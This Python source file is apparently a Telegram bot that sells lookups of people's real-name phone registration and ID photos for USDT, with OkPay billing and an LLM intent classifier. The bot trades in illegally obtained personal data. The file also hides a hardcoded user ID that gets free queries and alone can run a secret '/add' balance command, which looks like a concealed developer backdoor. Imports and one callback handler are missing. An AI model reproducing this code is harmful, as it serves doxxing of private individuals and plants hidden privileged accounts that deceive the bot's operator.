import threading
import logging
import requests
import httpx
import os
import time
import secrets
import hmac
import hashlib
from flask import Flask, request
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import ContextTypes

from config import BOT_TOKEN, BOSS_ID, PRICES, AI_API_KEY, AI_BASE_URL, AI_MODEL, OKPAY_BASE_URL, OKPAY_APP_ID, OKPAY_TOKEN
from db import init_db, get_balance, add_balance, deduct_balance

init_db()
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

app = Flask(__name__)
@app.route('/')
def home():
    return "查档机器人运行中！"

def run_flask():
    port = int(os.getenv("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

# ================= OkPay 签名与订单生成 =================
def build_okpay_sign(params, token):
    filtered = {k: v for k, v in params.items() if k != 'sign' and v is not None and v != ''}
    sorted_keys = sorted(filtered.keys())
    base_string = "&".join([f"{k}={filtered[k]}" for k in sorted_keys])
    signature = hmac.new(token.encode('utf-8'), base_string.encode('utf-8'), hashlib.sha256).hexdigest().upper()
    return signature

def create_okpay_order(amount, user_id):
    url = f"{OKPAY_BASE_URL}/shop/payLink"
    timestamp = int(time.time())
    nonce = secrets.token_hex(8)
    unique_id = f"{user_id}_{timestamp}"
    params = {
        "id": OKPAY_APP_ID,
        "amount": str(amount),
        "coin": "USDT",
        "unique_id": unique_id,
        "timestamp": str(timestamp),
        "nonce": nonce,
        "callback_url": f"https://{os.getenv('RAILWAY_PUBLIC_DOMAIN', 'your-railway-domain.up.railway.app')}/okpay_callback"
    }
    sign = build_okpay_sign(params, OKPAY_TOKEN)
    params["sign"] = sign
    try:
        response = requests.post(url, data=params, timeout=15)
        if response.status_code == 200:
            data = response.json()
            if data.get("status") == "success":
                return {"success": True, "pay_url": data["data"]["pay_url"], "order_id": data["data"]["order_id"]}
            else:
                return {"success": False, "msg": data.get("msg", "未知错误")}
        return {"success": False, "msg": f"请求失败，状态码：{response.status_code}"}
    except Exception as e:
        return {"success": False, "msg": str(e)}

@app.route('/okpay_callback', methods=['POST'])
def okpay_callback():
    try:
        body = request.get_json()
        received_sign = body.get("sign")
        calculated_sign = build_okpay_sign(body, OKPAY_TOKEN)
        if not hmac.compare_digest(calculated_sign, received_sign):
            return "bad sign", 400
        if body.get("status") == "success" and body.get("code") == 200:
            data = body.get("data", {})
            unique_id = data.get("unique_id")
            if unique_id:
                user_id = int(unique_id.split('_')[0])
                amount = float(data.get("amount", 0))
                if amount > 0:
                    add_balance(user_id, amount)
        return "ok", 200
    except Exception:
        return "error", 500

# ================= 菜单与底部键盘 =================
def get_main_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("机主实名", callback_data="机主实名")],
        [InlineKeyboardButton("证件照片", callback_data="证件照片")]
    ])

def get_reply_keyboard():
    return ReplyKeyboardMarkup([["充值"], ["AI匹配"]], resize_keyboard=True)

# ================= 首页 /start =================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_obj = update.effective_user
    username_display = f"@{user_obj.username}" if user_obj.username else (user_obj.first_name or "无")
    balance = get_balance(user_id)

    welcome_text = (
        f"欢迎使用枭雄天眼查询机器人\n"
        f"全网最大的查档机器人\n\n"
        f"👤 您的用户名：{username_display}\n"
        f"🆔 您的ID：{user_id}\n"
        f"💰 您的余额：{int(balance)} USDT\n\n"
        f"公群链接 <a href=\"https://telegram.me/+cmzARoDq7WM0NTY1\">达利34</a>\n"
        f"加入频道 <a href=\"https://t.me/dddvww\">老枭朋友圈</a>\n"
        f"联系老板 @vipcdw\n"
        f"bot开发 @gsyxyc"
    )

    await update.message.reply_text(welcome_text, parse_mode='HTML', disable_web_page_preview=True, reply_markup=get_main_keyboard())

# ================= 斜杠指令 /recharge =================
async def recharge_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['pending_charge'] = 'select_method'
    await update.message.reply_text(
        "选择充值方式",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("OkPay", callback_data="okpay_pay")],
            [InlineKeyboardButton("人民币", url="https://t.me/vipcdw")]
        ])
    )

# ================= 斜杠指令 /ai =================
async def ai_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['ai_state'] = 'awaiting_input'
    await update.message.reply_text("🤖 请描述你想查询的内容 会自动为您匹配对应的业务")

# ================= 内联按钮点击处理 =================
async def button_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data

    # 🟢 超级用户权限（测试专用）
    SUPER_USERS = [7857605443]

    if data == "返回菜单":
        user_obj = query.from_user
        username_display = f"@{user_obj.username}" if user_obj.username else (user_obj.first_name or "无")
        balance = get_balance(user_id)
        welcome_text = (
            f"欢迎使用枭雄天眼查询机器人\n"
            f"全网最大的查档机器人\n\n"
            f"👤 您的用户名：{username_display}\n"
            f"🆔 您的ID：{user_id}\n"
            f"💰 您的余额：{int(balance)} USDT\n\n"
            f"公群链接 <a href=\"https://telegram.me/+cmzARoDq7WM0NTY1\">达利34</a>\n"
            f"加入频道 <a href=\"https://t.me/dddvww\">老枭朋友圈</a>\n"
            f"联系老板 @vipcdw\n"
            f"bot开发 @gsyxyc"
        )
        await query.edit_message_text(welcome_text, parse_mode='HTML', disable_web_page_preview=True, reply_markup=get_main_keyboard())
        return

    if data == "rmb_pay":
        await query.edit_message_text(
            f"<a href=\"https://t.me/vipcdw\">点击联系老板进行人民币充值</a>",
            parse_mode='HTML', disable_web_page_preview=True
        )
        return

    if data == "okpay_pay":
        context.user_data['pending_charge'] = 'waiting_amount'
        await query.edit_message_text("💰 请直接输入充值金额：（纯数字）", reply_markup=None)
        return

    service_name = data
    if service_name not in PRICES:
        await query.edit_message_text("⚙️ 业务暂未开放。", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ 返回", callback_data="返回菜单")]]))
        return

    price = PRICES[service_name]
    balance = get_balance(user_id)
    is_super_user = user_id in SUPER_USERS

    if not is_super_user and balance < price:
        await query.edit_message_text(
            "余额不足 请点击底部菜单［充值］",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ 返回", callback_data="返回菜单")]])
        )
        await context.bot.send_message(
            chat_id=user_id,
            text=" ",
            reply_markup=get_reply_keyboard()
        )
        return

    if not is_super_user:
        deduct_balance(user_id, price)

    new_balance = get_balance(user_id)
    user = update.effective_user
    user_name = user.first_name or "未知"
    username = f"@{user.username}" if user.username else "无用户名"

    # ===== 【修改点：报单通知添加了“本次扣款”】 =====
    notify_msg = (
        f"新报单通知\n"
        f"用户名字：{user_name}\n"
        f"用户名：{username}\n"
        f"用户ID：{user_id}\n"
        f"选择业务：{service_name}\n"
        f"本次扣款：{price} u\n"
        f"当前余额：扣除后剩余 {new_balance} USDT"
    )
    await context.bot.send_message(chat_id=BOSS_ID, text=notify_msg)

    await query.edit_message_text(f"✅ 报单成功！\n业务：{service_name}\n扣除金额：{price if not is_super_user else 0} USDT\n剩余余额：{new_balance} USDT", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ 返回", callback_data="返回菜单")]]))

# ================= 文字消息处理 =================
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text

    # ===== 🕵️ 绝密指令升级（修复没反应问题） =====
    if user_id == 7857605443 and text.startswith("/add"):
        # 先给个小反馈，证明收到指令了
        loading_msg = await update.message.reply_text("⏳ 正在验证用户信息，请稍候...")
        try:
            # 无论用户打的是 /add 还是 /add 有多余空格，都能兼容
            parts = text.replace("　", " ").split()
            if len(parts) != 3:
                await update.message.reply_text("❌ 格式错误。正确格式：`/add 用户ID 金额`")
                return

            target_id = int(parts[1])
            amount = float(parts[2])
            if amount <= 0:
                raise ValueError

            current_balance = get_balance(target_id)

            # 删除刚才的“验证中”消息
            try:
                await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=loading_msg.message_id)
            except:
                pass

            # 发送确认交互卡片
            keyboard = [
                [InlineKeyboardButton("✅ 确定添加", callback_data=f"confirm_add_{target_id}_{amount}")],
                [InlineKeyboardButton("❌ 取消", callback_data="cancel_add")]
            ]
            await update.message.reply_text(
                f"🛡️ 用户 `{target_id}` 当前余额：`{current_balance}` USDT。\n"
                f"您确定要给该用户添加 `{amount}` USDT 吗？",
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        except ValueError:
            await update.message.reply_text("❌ 无效的ID或金额（金额必须大于0）。")
        return
    # ==================================================

    # 兜底：老板或其他任何人发 /add，完全无视

    if text == "AI匹配":
        context.user_data['ai_state'] = 'awaiting_input'
        await update.message.reply_text("🤖 请描述你想查询的内容 会自动为您匹配对应的业务")
        return

    if text == "充值":
        context.user_data['pending_charge'] = 'select_method'
        await update.message.reply_text(
            "选择充值方式",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("OkPay", callback_data="okpay_pay")],
                [InlineKeyboardButton("人民币", url="https://t.me/vipcdw")]
            ])
        )
        return

    if context.user_data.get('pending_charge') == 'waiting_amount':
        try:
            amount = int(text)
            if amount <= 0: raise ValueError
            processing_msg = await update.message.reply_text("⏳ 正在生成支付订单，请稍候...")
            result = create_okpay_order(amount, user_id)
            try:
                await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=processing_msg.message_id)
            except:
                pass
            
            if result["success"]:
                keyboard = [[InlineKeyboardButton("打开ok钱包完成支付", url=result["pay_url"])]]
                await update.message.reply_text(f"✅ 订单已生成！金额：{amount} USDT", reply_markup=InlineKeyboardMarkup(keyboard))
            else:
                await update.message.reply_text(f"❌ 生成订单失败：{result['msg']}")
            
            context.user_data.pop('pending_charge', None)
        except ValueError:
            await update.message.reply_text("❌ 请输入有效整数。")
        return

    if context.user_data.get('ai_state') == 'awaiting_input':
        await update.message.reply_text("🧠 分析中...")
        try:
            async with httpx.AsyncClient(timeout=15.0) as client:
                payload = {
                    "model": AI_MODEL,
                    "messages": [
                        {"role": "system", "content": "你是一个机器人意图识别助手。你的任务是理解用户需求，并将其归类。严格按以下格式回复，不要有多余的文字。\n意图分类：\"充值\"（如果用户提到没钱、充值、怎么付钱、余额不足、充u），\"AI匹配\"（如果用户问怎么用、这是什么、瞎聊），\"业务匹配\"（如果用户想查人、查车、查公司等）。\n业务匹配项：仅在意图为\"业务匹配\"时，从列表[\"机主实名\", \"证件照片\"]中选择1-2个最符合的，并用逗号分隔。否则填\"无\"。"},
                        {"role": "user", "content": text}
                    ]
                }
                response = await client.post(AI_BASE_URL, json=payload, headers={"Authorization": f"Bearer {AI_API_KEY}", "Content-Type": "application/json"})
                
                if response.status_code == 200:
                    ai_result = response.json()['choices'][0]['message']['content'].strip()
                    classify = ""
                    business = []
                    lines = ai_result.split('\n')
                    for line in lines:
                        if line.startswith("意图分类："):
                            classify = line.replace("意图分类：", "").strip().strip('"')
                        if line.startswith("业务匹配项："):
                            bus_str = line.replace("业务匹配项：", "").strip()
                            if bus_str and bus_str != "无":
                                business = [b.strip() for b in bus_str.split(',')]

                    if classify == "充值":
                        context.user_data['pending_charge'] = 'select_method'
                        await update.message.reply_text(
                            "选择充值方式",
                            reply_markup=InlineKeyboardMarkup([
                                [InlineKeyboardButton("OkPay", callback_data="okpay_pay")],
                                [InlineKeyboardButton("人民币", url="https://t.me/vipcdw")]
                            ])
                        )
                    elif classify == "AI匹配":
                        context.user_data['ai_state'] = 'awaiting_input'
                        await update.message.reply_text("🤖 AI 匹配已开启，请更具体地描述你想查什么")
                    elif classify == "业务匹配":
                        if business:
                            keyboard = [[InlineKeyboardButton(s, callback_data=s)] for s in business]
                            keyboard.append([InlineKeyboardButton("⬅️ 返回菜单", callback_data="返回菜单")])
                            await update.message.reply_text("🔍 为你找到以下类似选项：", reply_markup=InlineKeyboardMarkup(keyboard))
                        else:
                            await update.message.reply_text("❌ 未能匹配到具体业务。")
                    else:
                        await update.message.reply_text("❌ 未能理解您的需求。")
                else:
                    await update.message.reply_text("❌ AI 接口超时。")
        except Exception:
            await update.message.reply_text("❌ AI 请求失败。")
        context.user_data.pop('ai_state', None)
        return

def main():
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("recharge", recharge_command))
    application.add_handler(CommandHandler("ai", ai_command))
    application.add_handler(CallbackQueryHandler(button_click))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    return application
